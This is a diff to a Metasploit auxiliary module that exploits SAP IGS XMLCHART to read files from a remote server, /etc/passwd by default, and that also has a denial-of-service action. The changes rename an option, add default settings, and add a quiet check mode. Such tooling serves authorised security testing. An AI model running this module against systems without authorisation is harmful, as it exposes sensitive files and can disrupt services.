@@ -34,6 +34,10 @@ class MetasploitModule < Msf::Auxiliary
             [ 'DOS', { 'Description' => 'Denial Of Service' } ]
           ],
           'DefaultAction' => 'READ',
+          'DefaultOptions' => {
+            'VERBOSE' => true, # Enable verbose mode (show file content from remote server)
+            'SSL' => false # Disable SSL (by default SAP IGS not use SSL/TLS)
+          },
           'DisclosureDate' => '2018-03-14'
         )
     )
@@ -41,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(40080),
         OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
-        OptString.new('URN', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
+        OptString.new('PATH', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
       ]
     )
   end
@@ -49,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
   def setup_xml_and_variables
     @host = @datastore['RHOSTS']
     @port = @datastore['RPORT']
-    @urn = @datastore['URN']
+    @urn = @datastore['PATH']
     @file = @datastore['FILE']
     if datastore['SSL']
       @schema = 'https://'
@@ -146,7 +150,7 @@ class MetasploitModule < Msf::Auxiliary
     @file_content = file_content.gsub('>', '')
   end
 
-  def analyze_first_response(html_response)
+  def analyze_first_response(html_response, check = false)
     get_download_link(html_response)
     if @download_link
       begin
@@ -163,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil? || second_response.code != 200
       get_file_content(second_response.body)
-    else
+    elsif !check
       print_status("System is vulnerable, but the file #{@file} was not found on the host #{@host}")
     end
   end
@@ -198,7 +202,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Get OS release information
     os_release = ''
-    analyze_first_response(check_response.body)
+    analyze_first_response(check_response.body, true)
     if @file_content
       if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
         os_release = "OS info: #{os_regex[:os]}"
